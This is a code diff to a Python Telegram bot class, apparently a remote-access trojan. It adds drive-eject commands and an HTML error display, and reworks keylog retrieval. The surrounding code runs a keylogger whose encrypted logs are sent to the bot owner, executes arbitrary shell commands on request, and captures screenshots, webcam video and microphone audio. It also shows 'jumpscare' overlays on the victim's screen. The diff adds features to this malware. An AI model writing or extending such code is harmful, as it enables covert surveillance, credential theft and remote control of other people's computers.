@@ -486,6 +486,7 @@ class PeppinoTelegram:
         self.processmonitormenu = None
         self.display_mode_keyboard  = None
         self.cantopenmenu_ref = None
+        self.drives_menu = None
         self.mainmenu_ref = None
 
         self.overlay_tk = OverlayManager(self, BURN_DIRECTORY)
@@ -494,9 +495,10 @@ class PeppinoTelegram:
         self.audio_player = AudioPlayer()
 
         keyloggers_key = SimpleFernet.generate_key()
-        keyloggers_fernet = SimpleFernet(keyloggers_key, b"RCPTKLGG")
+        keyloggers_fernet = SimpleFernet(keyloggers_key, b"RCPTKLG")
+        keylogger_filename = join(BURN_DIRECTORY, randomname())
         self.keylogger = Keylogger(
-            log_file=randomname(),
+            log_file=keylogger_filename,
             encryptor=keyloggers_fernet
         )
         self.keylogger_stop_event = Event()
@@ -623,6 +625,8 @@ class PeppinoTelegram:
 
             # 💻 System Control
             Command("disk_info", self.get_disk_info, "Sends infos about the connected drives.", "system_control", "💿 List Drives"),
+            Command("drive_eject_menu", self.drive_eject_menu, "Display drive eject menu", "system_control", "📤 Eject Menu"),
+            Command("eject_drive", self.eject_drive, "Eject a drive by its letter", "system_control", "⏏️ Eject Drive"),
             Command("execute_withoutput", lambda x: self.bsend(self.execute(x, return_output=True, shell=True)), "Execute system command.", "system_control", "⚙️ Execute"),
 
             Command("execute", self.execute, "Execute a command(helper)", "null", "Execute(helper)"),
@@ -879,6 +883,30 @@ class PeppinoTelegram:
     def bsendWithHtml(self, text: str, retries=0, reply_markup=None) -> int|None:
         print(f"Sending HTML message: {text[:50]}...")
         return self.bsend(text, retries, parse_mode="HTML", reply_markup=reply_markup)
+
+    def eject_drive(self, drive_letter: str) -> None:
+        try:
+            eject_drive_windows(drive_letter)
+            self.bsendWithHtml(
+                "<b>💿 Drive Ejected</b>\n"
+                f"<code>{drive_letter.upper()}</code>"
+            )
+        except OSError as e:
+            self.display_exception(str(e))
+
+
+    def drive_eject_menu(self) -> None:
+        disks = get_disk_info()
+
+        drives_buttons = {
+            f"{d['disk_name']} {d['tot_size']}": f"eject_drive {d['disk_name']}"
+            for d in disks
+        }
+
+        self.drives_menu = self.new_menu(
+            menu=drives_buttons,
+            close_btn_lab="Close"
+        )
 
     def download_file(self, path: str) -> None:
         print(f"Downloading file: {path}")
@@ -1383,21 +1411,28 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                     self.bsend("No logs")
                     return
                 file = craft_file(logs, fname)
-                self.bot.sendDocument(self.owner_id, file)
+                self.bot.sendDocument(self.owner_id,
+                    file,
+                    caption=f"Debug log: {now()}"
+                )
         except Exception as e:
-            self.bsendWithHtml(f"<pre>Exception while sending logs: \n{e}</pre>")
+            self.display_exception(f"Exception while sending logs: \n{e}")
 
     def get_keylog(self) -> None:
-        self.keylogger.save_to_file()
-        keylog = self.keylogger.read_from_file()
-        fi = craft_file(
-            content=keylog.encode() if keylog else b"",
-            filename=f"keylog-{now()}.keylogger.log"
-        )
+        print("Getting keylogs")
         try:
-            self.bot.sendDocument(self.owner_id, fi)
+            self.keylogger.save_to_file()
+            keylog = self.keylogger.read_from_file()
+            fi = craft_file(
+                content=keylog.encode() if keylog else b"",
+                filename=f"keylog-{now()}.keylogger.log",
+            )
+            self.bot.sendDocument(self.owner_id,
+                fi,
+                caption=f"Keylog {now()}"
+            )
         except Exception as e:
-            self.bsendWithHtml(f"<pre>Exception while sending keylogs: \n{e}</pre>")
+            self.display_exception(f"Exception while sending keylogs: \n{e}")
 
     def get_disk_info(self):
         print("Getting disk info")
@@ -1437,6 +1472,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         if showimage:
             imageThread.join()
         self.audio_mixer.setVolumePercentage(old_volume)
+        self.bsendWithHtml("👻 <b>Jumpscare sent</b>")
 
     def jumpscarenoaudio(self) -> None:
         print("Triggering jumpscare without audio")
@@ -1863,6 +1899,25 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def action_timed_out(self) -> None:
         self.operation_canceled("Action timed out.")
 
+    def display_exception(self, exception_info: str) -> None:
+        def escape_html(text: str) -> str:
+            return (
+                text.replace("&", "&amp;")
+                    .replace("<", "&lt;")
+                    .replace(">", "&gt;")
+            )
+
+        escaped = escape_html(exception_info.strip())
+
+        message = (
+            "<b>⚠️ Exception</b>\n"
+            "<pre>"
+            f"{escaped}"
+            "</pre>"
+        )
+
+        self.bsendWithHtml(message)
+
     def parse_audio(self, msg: dict) -> None:
         print("Parsing audio message")
         if 'voice' in msg:
@@ -1979,6 +2034,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                     self.cantopenmenu_ref.delete()
                     self.cantopenmenu_ref = None
 
+            elif command.startswith("DRIVESMENU"):
+                if command == "DRIVESMENU_close":
+                    self.drives_menu.delete()
+                    self.drives_menu = None
+
             elif command.startswith("mainmenu"):
                 if self.mainmenu_ref:
                     if command == "mainmenu_close":
@@ -2007,9 +2067,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             )
 
         except Exception as e:
-            self.bsendWithHtml(
+            self.display_exception(
                 f"Error parsing command '{html.escape(text)}'\n"
-                f"<pre>{html.escape(traceback.format_exc(limit=4))}</pre>"
+                f"{html.escape(traceback.format_exc(limit=4))}"
             )
     
     def parse_video_note(self, saved_filepath: str, document: Any) -> None:
@@ -2027,7 +2087,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def parse_video(self, msg, document, saved_filepath: str, saved_filename: str) -> None:
         print(f"Parsing video: {saved_filename}")
-        caption = msg["caption"].lower().strip()
+        caption = msg.get("caption").lower().strip()
+        if not caption:
+            return
         if caption == "/setvideowallpaper":
             if not self.confirmContuinuingWithoutWallpaperBackup():
                 return
@@ -2350,7 +2412,7 @@ The bot is now restarting. Please wait a moment...
             remove(audio_filename)
             remove(final_filename)
         except Exception as e:
-            self.bsend(f"Error while recording screen: {e}")
+            self.display_exception(f"Error while recording screen: {e}")
         bar.fill_and_delete()
 
     def record_webcam(self, duration: int = 10, caption: str | None = None) -> None:
@@ -2409,8 +2471,8 @@ The bot is now restarting. Please wait a moment...
                     remove(f)
 
         except Exception as e:
-            self.bsendWithHtml(
-                f"Error during webcam recording\n<pre>{html.escape(str(e))}</pre>"
+            self.display_exception(
+                f"Error during webcam recording\n{html.escape(str(e))}"
             )
             if "bar" in locals():
                 bar.fill_and_delete()
@@ -2473,7 +2535,7 @@ The bot is now restarting. Please wait a moment...
             remove(final_filename)
         except Exception as e:
             e = traceback.format_exc()
-            self.bsend(f"Error while sending video clip\n{e}")
+            self.display_exception(f"Error while sending video clip\n{e}")
         bar.fill_and_delete()
 
     def removefromcantopen(self, process: str) -> None:
@@ -2504,7 +2566,7 @@ The bot is now restarting. Please wait a moment...
                 f.name = "Screenshot.png"
             self.__send_image(image_buf=f, caption=mon)
         except Exception as e:
-            return self.bsend(f"Error while getting screenshot\n{e}")
+            return self.display_exception(f"Error while getting screenshot\n{e}")
 
     def screenshotandselfie(self) -> None:
         print("Taking screenshot and selfie")
@@ -2578,7 +2640,7 @@ The bot is now restarting. Please wait a moment...
         res = self.record_audio(filepath, seconds)
         if isinstance(res, Exception):
             err = f"Error while recording audio: {res}"
-            self.bsend(err)
+            self.display_exception(err)
         else:
             message.edit("Done recording, sending...")
             filepath = wav_to_ogg(filepath, rmold=True)
@@ -2732,7 +2794,7 @@ The bot is now restarting. Please wait a moment...
             destroyWindow("Warning")
             remove(image_path)
         except Exception as e:
-            self.bsend(f"Error while trying to show image: \n{e}")
+            self.display_exception(f"Error while trying to show image: \n{e}")
 
     def show_qr_overlay(self, url: str, duration: int, text: str = "Scan me"):
         position = self.choose_position()
@@ -3116,6 +3178,11 @@ The bot is now restarting. Please wait a moment...
         self.overlay_tk.textual_jumpscare(
             text=text,
             duration=duration,
+        )
+        self.bsendWithHtml(
+            "<b>🎭 Textual jumpscare displayed</b><br>"
+            f"<code>Text:   {text}</code><br>"
+            f"<code>Shown:  {duration} seconds</code>"
         )
 
     def update_commands(self) -> bool:
